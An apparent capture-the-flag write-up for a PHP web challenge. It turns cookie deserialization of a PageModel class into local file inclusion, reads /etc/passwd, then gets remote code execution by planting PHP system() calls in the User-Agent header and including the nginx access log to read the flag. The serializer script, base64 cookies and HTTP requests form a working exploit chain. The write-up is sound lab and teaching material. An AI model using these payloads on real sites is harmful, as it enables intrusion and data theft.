# Category: Web Challenges

The code provided is very simple.
When the cookie is passed it gets unserialized and a magic method is present in the class `PageModel`.
The `__destruct` method allows to use  php `include` directive to read a file.
We've a `LFI` via object deserialization.

In fact we can read files:


```php
<?php
class PageModel
{
    public $file = "/etc/passwd";
}


$obj = new PageModel;
echo base64_encode(serialize($obj));

?>
```

doing a simple request to `/` we'll let us to see output:


```
GET / HTTP/1.1
Host: localhost:1337
Upgrade-Insecure-Requests: 1
User-Agent: <?php system("ls -la /"); ?>
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30=
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www:x:1000:1000:1000:/home/www:/bin/sh
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```

The problem is taht has shown in `entrypoint.sh`

```
# Generate random flag filename
mv /flag /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`
```

flag file name is renamed appending 5 random characters to the flag.
So to read the flag which should known flag file name.
Also we can't use linux wildcards like `*` or `?` for autocompletion in the include function.

Looking at `nginx.conf` we can find an useful directive, in fact we can see that logs are saved under 
`/var/log/nginx/access.log`.

Let's serialize the payload 

```php
<?php
class PageModel
{
    public $file = "/var/log/nginx/access.log";
}


$obj = new PageModel;
echo base64_encode(serialize($obj));

?>
```

and send it back to the server


response

```http
HTTP/1.1 500 Internal Server Error
Server: nginx
Date: Sun, 07 Jan 2024 07:59:45 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.26
Content-Length: 772

172.17.0.1 - 200 "GET /index.php HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
172.17.0.1 - 200 "GET /index.php HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "
```

Searching on internet, I came across a technique called `Log Poisoning`. In fact, due to this flaw is possible to escalate a `LFI` to `RCE` by injecting with a php web shell headers. The header injected should be the same as one of the headers within the response of the log `LFI`.
In this case `User-Agent`. Before to proceed I want to underline that in the paylaod, `"` quotes won't work for some reason.

So the first thing to do is to request `/` with an user agent injected.

```
GET / HTTP/1.1
Host: localhost:1337
Upgrade-Insecure-Requests: 1
User-Agent: <?php system('whoami'); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

```

and then read the log again

```
GET / HTTP/1.1
Host: localhost:1337
Upgrade-Insecure-Requests: 1
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

```

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 07 Jan 2024 08:49:26 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.26
Content-Length: 89

172.17.0.1 - 200 "GET / HTTP/1.1" "-" "-" 
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "www
" 
```

In the log we can observe `www`. We're www user and the whoami shell command worked.
Well, since for some reasons sending more then one payload at a time to the challenge let's the server crash with a `500 Internal Server Error` when requesting logs, I used bash wildcards to retrivie the flag without looking at its name first:

`<?php system('cat /flag_?????'); ?>`

I used `?` since I know the random character generated.
Injecting it in `User-Agent` while requesting a random resource (example `/`) and reading the log file back, will let us to get the flag.

We need to underline that `log poisoning` is possible only under `LFI` circumstances. This because reading the log file, triggers the execution of saved command. Without sending a read request for the file, the paylaod won't be executed.

